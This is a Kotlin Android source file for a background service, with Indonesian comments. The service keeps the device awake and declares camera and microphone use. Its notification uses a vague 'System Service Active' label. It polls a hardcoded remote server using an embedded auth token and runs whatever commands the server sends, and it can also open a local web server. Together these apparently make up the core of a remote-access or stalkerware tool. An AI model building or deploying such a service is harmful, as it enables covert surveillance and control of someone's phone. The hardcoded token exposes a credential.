package com.example.devicecontrol

import android.app.*
import android.content.*
import android.os.*
import android.util.Log
import android.content.pm.ServiceInfo
import androidx.core.app.NotificationCompat
import android.net.wifi.WifiManager

class ControlService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    private var pollingManager: PollingManager? = null
    private lateinit var commandHandler: CommandHandler
    private var localWebServer: LocalWebServer? = null

    companion object {
        private const val CHANNEL_ID = "device_control_channel"
        private const val NOTIFICATION_ID = 101
        private const val TAG = "ControlService"
        private const val WEB_SERVER_PORT = 8080
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        // Android 14+ support dengan literal angka (Safe-Build)
        if (Build.VERSION.SDK_INT >= 34) {
            val type = 1073741824 or 64 or 128 // specialUse | camera | microphone
            startForeground(NOTIFICATION_ID, createNotification(), type)
        } else {
            startForeground(NOTIFICATION_ID, createNotification())
        }

        Log.d(TAG, "Service Created")
        acquireLocks()

        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)

        // Start Local Web Server only if enabled
        val webServerEnabled = prefs.getBoolean("web_server_enabled", false)
        if (webServerEnabled) {
            startWebServer()
        } else {
            Log.d(TAG, "Local Web Server is disabled by user preference")
        }

        commandHandler = CommandHandler(this)

        val isTurbo = prefs.getBoolean("turbo_mode", true)
        startPolling(isTurbo)
    }

    /**
     * Memulai (atau me-restart) PollingManager dengan mode yang ditentukan.
     * Selalu hentikan instance lama sebelum membuat yang baru.
     */
    private fun startPolling(isTurbo: Boolean) {
        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("ws_url", "https://pygram.xnv.biz.id") ?: ""
        val devId = prefs.getString("device_id", "my_phone") ?: "unknown"
        val authToken = prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8") ?: ""

        var cleanUrl = serverUrl.replace("/ws", "").replace("wss://", "https://").replace("ws://", "http://")
        if (cleanUrl.endsWith("/")) cleanUrl = cleanUrl.substring(0, cleanUrl.length - 1)

        pollingManager?.stop()
        pollingManager = PollingManager(
            baseUrl = cleanUrl,
            clientId = devId,
            authToken = authToken,
            handler = commandHandler,
            isTurbo = isTurbo,
            onModeChanged = { newIsTurbo ->
                // Dipanggil dari thread OkHttp, pindah ke main thread untuk keamanan
                Handler(mainLooper).post {
                    handleModeChange(newIsTurbo)
                }
            }
        )
        pollingManager?.start()

        val modeLabel = if (isTurbo) "TURBO" else "NORMAL"
        Log.d(TAG, "Polling dimulai dalam mode $modeLabel")
    }

    /**
     * Dipanggil saat server menginstruksikan perubahan polling mode.
     * Simpan ke SharedPrefs lalu restart polling dengan mode baru.
     */
    private fun handleModeChange(newIsTurbo: Boolean) {
        val modeLabel = if (newIsTurbo) "TURBO" else "NORMAL"
        Log.i(TAG, "Server instruksikan ganti mode → $modeLabel")

        // Simpan mode baru ke SharedPreferencess agar persisten
        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("turbo_mode", newIsTurbo).apply()

        // Restart polling dengan mode baru
        startPolling(newIsTurbo)
    }

    private fun startWebServer() {
        try {
            if (localWebServer == null || !localWebServer!!.isAlive) {
                localWebServer = LocalWebServer(this, WEB_SERVER_PORT)
                localWebServer?.start()
                Log.d(TAG, "Local Web Server started on port $WEB_SERVER_PORT")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start Local Web Server: ${e.message}")
        }
    }

    private fun stopWebServer() {
        localWebServer?.stop()
        localWebServer = null
        Log.d(TAG, "Local Web Server stopped")
    }

    private fun acquireLocks() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DeviceControl::WakeLock")
        wakeLock?.acquire()

        val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "DeviceControl::WifiLock")
        wifiLock?.acquire()
    }

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Active")
            .setContentText("Monitoring background tasks...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(CHANNEL_ID, "Background Service", NotificationManager.IMPORTANCE_HIGH)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "RESTART_POLLING" -> {
                Log.d(TAG, "Restarting Polling Manager with new config")
                val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
                val isTurbo = prefs.getBoolean("turbo_mode", true)
                startPolling(isTurbo)
            }
            "TOGGLE_WEB_SERVER" -> {
                val enabled = intent.getBooleanExtra("enabled", true)
                Log.d(TAG, "Toggle Web Server: enabled=$enabled")
                val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("web_server_enabled", enabled).apply()
                if (enabled) {
                    startWebServer()
                } else {
                    stopWebServer()
                }
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        pollingManager?.sendOfflineSignal()
        pollingManager?.stop()
        stopWebServer()
        wakeLock?.let { if (it.isHeld) it.release() }
        wifiLock?.let { if (it.isHeld) it.release() }
    }
}
